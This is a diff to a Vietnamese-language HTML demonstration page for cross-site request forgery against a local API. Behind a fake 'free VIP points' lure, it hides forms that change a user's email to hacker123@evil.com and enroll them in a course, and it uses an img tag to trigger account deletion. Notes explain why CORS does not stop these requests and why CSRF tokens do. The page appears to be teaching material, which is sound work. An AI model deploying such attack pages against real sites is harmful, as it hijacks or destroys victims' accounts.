@@ -16,7 +16,7 @@
             color: #333;
             padding: 40px;
             border-radius: 10px;
-            max-width: 600px;
+            max-width: 650px;
             margin: 0 auto;
             box-shadow: 0 10px 40px rgba(0,0,0,0.3);
         }
@@ -29,8 +29,19 @@
             border-radius: 5px;
             cursor: pointer;
             margin: 10px;
+            width: 100%;
         }
         button:hover { background: #45a049; }
+        .note {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            border-radius: 5px;
+            padding: 10px;
+            margin: 10px 0;
+            color: #856404;
+            font-size: 13px;
+            text-align: left;
+        }
         .debug {
             margin-top: 20px;
             padding: 15px;
@@ -41,6 +52,8 @@
             max-height: 300px;
             overflow-y: auto;
         }
+
+        .hidden-forms { display: none; }
     </style>
 </head>
 <body>
@@ -49,12 +62,41 @@
     <h2>Bạn được chọn nhận 1000 điểm MIỄN PHÍ</h2>
     <p>Nhấn nút bên dưới để kích hoạt tài khoản VIP của bạn!</p>
 
-    <button onclick="attack1()">🎁 Thay đổi Email (attack1)</button>
-    <button onclick="attack2()">📚 Đăng ký khóa học (attack2)</button>
-    <button onclick="attack3()">🔥 Xóa tài khoản (attack3)</button>
+    <div class="note">
+        ℹ️ <strong>Ghi chú kỹ thuật:</strong> Các attack dưới đây dùng <code>form submit</code>
+        — <strong>không có Preflight</strong>, browser gửi thẳng kèm cookie,
+        CORS <strong>không chặn được</strong>. Chỉ CSRF token mới chặn được!
+    </div>
+
+    <button onclick="attack1()">🎁 Thay đổi Email (form submit)</button>
+    <button onclick="attack2()">📚 Đăng ký khóa học (form submit)</button>
+    <button onclick="attack3()">🔥 Xóa tài khoản (img src trick)</button>
 
     <div id="status" style="margin-top: 20px; color: #666; font-weight: bold;"></div>
     <div id="debug" class="debug"></div>
+</div>
+
+<div class="hidden-forms">
+
+    <!-- Form 1: Thay đổi email -->
+    <form id="form-change-email"
+          action="http://localhost:8080/api/user/change-email"
+          method="POST"
+          enctype="application/x-www-form-urlencoded"
+          target="hidden-iframe-1">
+        <input type="hidden" name="newEmail" value="hacker123@evil.com">
+    </form>
+
+    <form id="form-enroll"
+          action="http://localhost:8080/api/user/enroll-course"
+          method="POST"
+          enctype="application/x-www-form-urlencoded"
+          target="hidden-iframe-2">
+        <input type="hidden" name="courseId" value="999">
+    </form>
+
+    <iframe name="hidden-iframe-1" id="iframe-1"></iframe>
+    <iframe name="hidden-iframe-2" id="iframe-2"></iframe>
 </div>
 
 <script>
@@ -63,119 +105,82 @@
 
     function log(message, isError = false) {
         const timestamp = new Date().toLocaleTimeString();
-        const color = isError ? 'red' : 'green';
+        const color = isError ? 'red' : '#333';
         debugDiv.innerHTML += `<div style="color: ${color};">[${timestamp}] ${message}</div>`;
         debugDiv.scrollTop = debugDiv.scrollHeight;
     }
 
-    // Attack 1: Thay đổi email bằng fetch
-    async function attack1() {
-        statusDiv.innerHTML = '📡 Đang tấn công... (Thay đổi email)';
-        log('🚀 Bắt đầu attack1: Thay đổi email');
+    // Attack 1: Form submit thay đổi email
+    // - Không có Preflight
+    // - Browser gửi thẳng kèm cookie
+    // - Content-Type: application/x-www-form-urlencoded (Simple Request)
+    function attack1() {
+        log('🚀 Attack1: Submit form thay đổi email');
+        log('📋 Loại request: Simple Request (form submit)');
+        log('🚫 Không có Preflight → CORS không chặn được!');
+        log('🍪 Browser tự động gửi kèm cookie accessToken...');
 
-        try {
-            const response = await fetch('http://localhost:8080/api/user/change-email', {
-                method: 'POST',
-                credentials: 'include', // ← Gửi cookie
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    newEmail: 'hacker@evil.com'
-                })
-            });
+        document.getElementById('form-change-email').submit();
 
-            log(`📥 Response status: ${response.status} ${response.statusText}`);
+        statusDiv.innerHTML = '📡 Form đã submit! Kiểm tra server xem email có đổi không...';
 
-            if (response.ok) {
-                const data = await response.json();
-                log(`✅ Thành công! Response: ${JSON.stringify(data)}`);
-                statusDiv.innerHTML = '✅ Email đã bị thay đổi thành hacker@evil.com';
-            } else {
-                const errorText = await response.text();
-                log(`❌ Lỗi ${response.status}: ${errorText}`, true);
-                statusDiv.innerHTML = `❌ Lỗi ${response.status}`;
+        // Đợi chút rồi kiểm tra iframe response
+        setTimeout(() => {
+            try {
+                const iframe = document.getElementById('iframe-1');
+                log(`📥 Response từ server: ${iframe.contentDocument?.body?.innerText || '(không đọc được do CORS - nhưng request đã gửi!)'}`);
+            } catch(e) {
+                log('📥 Không đọc được response (same-origin policy trên response) — nhưng REQUEST ĐÃ ĐƯỢC GỬI ĐI!');
+                log('✅ Vào server log để xem request có đến không.');
             }
-
-        } catch (error) {
-            log(`❌ Exception: ${error.message}`, true);
-            statusDiv.innerHTML = `❌ Lỗi: ${error.message}`;
-        }
+        }, 2000);
     }
 
-    // Attack 2: Đăng ký khóa học
-    async function attack2() {
-        statusDiv.innerHTML = '📡 Đang tấn công... (Đăng ký khóa học)';
-        log('🚀 Bắt đầu attack2: Đăng ký khóa học');
+    // Attack 2: Form submit đăng ký khóa học
+    function attack2() {
+        log('🚀 Attack2: Submit form đăng ký khóa học');
+        log('📋 Loại request: Simple Request (form submit)');
+        log('🚫 Không có Preflight → CORS không chặn được!');
 
-        try {
-            const response = await fetch('http://localhost:8080/api/user/enroll-course', {
-                method: 'POST',
-                credentials: 'include',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    courseId: 999
-                })
-            });
+        document.getElementById('form-enroll').submit();
 
-            log(`📥 Response status: ${response.status}`);
+        statusDiv.innerHTML = '📡 Form đã submit! Kiểm tra server log...';
 
-            if (response.ok) {
-                const data = await response.json();
-                log(`✅ Thành công! ${JSON.stringify(data)}`);
-                statusDiv.innerHTML = '✅ Đã đăng ký khóa học giả!';
-            } else {
-                log(`❌ Lỗi ${response.status}`, true);
-                statusDiv.innerHTML = `❌ Lỗi ${response.status}`;
+        setTimeout(() => {
+            try {
+                const iframe = document.getElementById('iframe-2');
+                log(`📥 Response: ${iframe.contentDocument?.body?.innerText || '(không đọc được)'}`);
+            } catch(e) {
+                log('📥 Request đã gửi! Kiểm tra server log để xác nhận.');
             }
-
-        } catch (error) {
-            log(`❌ Exception: ${error.message}`, true);
-            statusDiv.innerHTML = `❌ Lỗi: ${error.message}`;
-        }
+        }, 2000);
     }
 
-    // Attack 3: Xóa tài khoản
-    async function attack3() {
-        statusDiv.innerHTML = '📡 Đang tấn công... (Xóa tài khoản)';
-        log('🚀 Bắt đầu attack3: Xóa tài khoản');
+    function attack3() {
+        log('🚀 Attack3: Dùng thẻ <img> để gửi GET request');
+        log('📋 Loại request: Simple GET Request');
+        log('🚫 Không có Preflight → CORS không chặn được!');
+        log('🍪 Cookie được gửi kèm tự động');
 
-        try {
-            const response = await fetch('http://localhost:8080/api/user/delete-account', {
-                method: 'DELETE',
-                credentials: 'include'
-            });
+        const img = document.createElement('img');
+        img.src = 'http://localhost:8080/api/user/delete-account';
+        img.style.display = 'none';
 
-            log(`📥 Response status: ${response.status}`);
+        img.onload = () => log('✅ Request thành công! (server trả về ảnh hoặc 200)');
+        img.onerror = () => log('📥 Request đã gửi đến server! (lỗi vì server không trả về ảnh — nhưng request ĐÃ ĐẾN server!)');
 
-            if (response.ok) {
-                const data = await response.json();
-                log(`✅ Thành công! ${JSON.stringify(data)}`);
-                statusDiv.innerHTML = '✅ Tài khoản đã bị xóa!';
-            } else {
-                log(`❌ Lỗi ${response.status}`, true);
-                statusDiv.innerHTML = `❌ Lỗi ${response.status}`;
-            }
-
-        } catch (error) {
-            log(`❌ Exception: ${error.message}`, true);
-            statusDiv.innerHTML = `❌ Lỗi: ${error.message}`;
-        }
+        document.body.appendChild(img);
+        statusDiv.innerHTML = '📡 GET request đã gửi qua thẻ img!';
     }
 
-    // Debug: Hiển thị cookies hiện tại của trang này
-    log(`🍪 Cookies của trang này (${window.location.origin}): ${document.cookie || '(rỗng)'}`);
-    log('⚠️ Lưu ý: Cookies của localhost:8080 sẽ được browser tự động gửi khi attack!');
-
-    // Tự động kiểm tra khi load trang
-    window.onload = function() {
-        log('✅ Trang đã load xong. Sẵn sàng tấn công!');
-
-        // Uncomment dòng dưới để tự động tấn công sau 3 giây
-        // setTimeout(() => { attack1(); }, 3000);
-    };
+    log(`🍪 Cookies đọc được từ trang này: ${document.cookie || '(rỗng — httpOnly cookies không đọc được bằng JS, nhưng vẫn được gửi kèm request!)'}`);
+    log('');
+    log('📌 Sự khác biệt với fetch + JSON:');
+    log('   fetch + JSON → có Preflight OPTIONS → CORS chặn được');
+    log('   form submit  → KHÔNG có Preflight  → CORS KHÔNG chặn được');
+    log('   img src      → KHÔNG có Preflight  → CORS KHÔNG chặn được');
+    log('');
+    log('👉 Chỉ CSRF Token mới chặn được form submit attack!');
 </script>
 </body>
 </html>
